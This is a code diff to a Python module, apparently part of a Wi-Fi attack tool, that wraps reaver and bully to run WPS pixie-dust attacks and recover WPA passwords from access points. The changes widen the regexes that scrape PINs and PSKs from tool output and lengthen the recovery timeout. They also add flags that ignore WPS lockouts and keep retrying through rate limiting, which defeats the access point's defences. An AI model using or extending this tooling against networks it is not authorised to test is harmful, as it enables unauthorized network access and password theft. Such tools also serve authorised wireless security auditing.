@@ -5,7 +5,6 @@ Unlike the old wifite scraper, this reads only the handful of decisive reaver /
 bully lines — PIN, PSK, and the lock/timeout failures — which are stable across
 tool versions.
 """
-import os
 import re
 import select
 import subprocess
@@ -17,11 +16,23 @@ from attack import tools
 from attack.model import AttackEvent, EventType
 
 
-PIN_RE = re.compile(r"WPS PIN:\s*'?([0-9]{4,8})'?", re.I)
-PSK_RE = re.compile(r"WPA PSK:\s*'([^']*)'", re.I)
-FAIL_RE = re.compile(r"pin not found|pixie-?dust.*fail|failed to (?:associate|recover)",
-                     re.I)
-LOCK_RE = re.compile(r"rate limiting|WPS lock|AP (?:is )?locked|WARNING.*lock", re.I)
+# Reaver + bully PIN/PSK lines (pixie and -p recover).
+PIN_RE = re.compile(
+    r"(?:WPS PIN|PIN FOUND|Pin is|setting pin to)\s*:?\s*'?([0-9]{4,8})'?",
+    re.I)
+PSK_RE = re.compile(
+    r"(?:WPA PSK|key is)\s*:?\s*'([^']*)'",
+    re.I)
+# Terminal failures only — "Failed to associate" is a normal reaver retry.
+FAIL_RE = re.compile(
+    r"pin not found|pixie-?dust.*fail|failed to recover WPA key",
+    re.I)
+# Hard WPS lockout. Rate-limiting waits are non-terminal (reaver sleeps + retries).
+HARD_LOCK_RE = re.compile(
+    r"WPS lock(?:out)?|AP (?:is )?locked|WARNING.*(?:WPS )?lock",
+    re.I)
+
+GETPSK_TIMEOUT = 120
 
 
 def _build_cmd(tool, mon, target, ignore_locks):
@@ -107,7 +118,7 @@ def pixie(mon, target, req, emit, stop_flag):
                 break
             if pin and re.search(r"pixie", line, re.I) and "PIN" in line.upper():
                 break
-            if LOCK_RE.search(line) and not ignore_locks:
+            if HARD_LOCK_RE.search(line) and not ignore_locks:
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="wps lock"))
                 break
@@ -134,10 +145,12 @@ def pixie(mon, target, req, emit, stop_flag):
     # PIN to fetch the actual WPA PSK — that's what the PIN is *for*.
     if pin and psk is None and not (stop_flag and stop_flag.is_set()):
         emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
-                         phase="GETPSK", countdown=90, cd_max=90,
+                         phase="GETPSK", countdown=GETPSK_TIMEOUT,
+                         cd_max=GETPSK_TIMEOUT,
                          signal=target.get("signal")))
         psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
-                           tool=tool)
+                           tool=tool, ignore_locks=ignore_locks,
+                           timeout=GETPSK_TIMEOUT)
 
     if psk is not None or pin:
         # PSK = the Wi-Fi password (connectable). PIN alone = not connectable yet.
@@ -148,7 +161,7 @@ def pixie(mon, target, req, emit, stop_flag):
     return result
 
 
-def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=90):
+def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT):
     """Standalone PIN -> PSK recovery, driven from the UI (cracked detail view).
 
     Enables monitor mode on the external adapter, runs `reaver -p <pin>`, then
@@ -167,15 +180,16 @@ def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=90):
     try:
         with iface_mod.monitor_mode(name) as mon:
             return _recover_psk(mon, target, pin, emit, essid, bssid,
-                                stop_flag, timeout=timeout, tool=tool)
+                                stop_flag, timeout=timeout, tool=tool,
+                                ignore_locks=True)
     except RuntimeError as e:
         emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                          detail=str(e)[:20]))
         return None
 
 
-def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag, timeout=90,
-                 tool="reaver"):
+def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
+                 timeout=GETPSK_TIMEOUT, tool="reaver", ignore_locks=False):
     """Recover the WPA PSK from a known WPS PIN: `-p <pin>` does one WPS
     registration and prints the PSK. Uses whichever tool found the PIN (reaver
     or bully) — a pixie run with one shouldn't silently fail to fetch the PSK
@@ -189,11 +203,17 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag, timeout=90,
         cmd = [tools.BULLY, "-b", bssid, "-p", str(pin), "-d", "-v", "3"]
         if target.get("channel"):
             cmd += ["-c", str(target["channel"])]
+        if ignore_locks:
+            cmd.append("-L")
         cmd.append(mon)
     else:
-        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
+        # -N matches pixie; association retries must not abort recover.
+        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin),
+               "-N", "-vv"]
         if target.get("channel"):
             cmd += ["-c", str(target["channel"])]
+        if ignore_locks:
+            cmd.append("-L")
     tools.log("wps psk-recover: %s" % " ".join(cmd))
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
@@ -226,7 +246,10 @@ def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag, timeout=90,
             if m:
                 psk = m.group(1)
                 break
-            if LOCK_RE.search(line):
+            # Rate limiting: reaver waits and retries — keep listening.
+            if re.search(r"rate limiting", line, re.I):
+                continue
+            if HARD_LOCK_RE.search(line) and not ignore_locks:
                 fail_detail = "wps lock"
                 break
             if FAIL_RE.search(line):
